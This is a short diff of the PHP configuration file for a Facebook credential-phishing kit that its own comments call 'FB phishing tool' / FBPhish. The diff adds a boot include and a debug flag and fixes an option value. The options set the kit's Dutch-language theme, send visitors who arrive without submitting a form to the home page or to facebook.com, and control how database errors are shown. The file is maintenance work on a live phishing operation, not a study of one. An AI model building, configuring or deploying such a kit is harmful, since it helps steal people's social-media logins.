@@ -1,4 +1,10 @@
 <?php
+// Set SUPER Vars
+$apppath = dirname(__FILE__);
+
+// Require main boot
+require("$apppath/main.boot.php");
+
 // This is the configuration of the FB phishing tool!
 // Here you should define all database connection settings and other stuff
 // ALL OPTIONS, EXCEPT DATABASE SETTINGS AND MESSAGES SHOULD BE SET WITH LOWERCASE LETTERS AND/OR NUMBERS
@@ -9,6 +15,9 @@
 // FBPhish theme
 // You can create new themes by adding them to the 'themes' folder
 $theme = "nl_NL";
+
+// Turn debug on ("true") or off("false")
+$debug = "false";
 
 // If poeple come on action.php but did not submitted a form:
 // HOME: Redirect to index.php
@@ -36,7 +45,7 @@ $config_option__302 = "home";
 // FACEBOOK: Redirect to facebook.com
 // SHOW: Show the SQL/PDO error
 // NOT HOME, FACEBOOK OR SHOW: Then redirect to the entered link (example: if you enter google.com in the var it will redirect to goole)
-$config_option__451 = "sho";
+$config_option__451 = "show";
 
 
 // Database settings
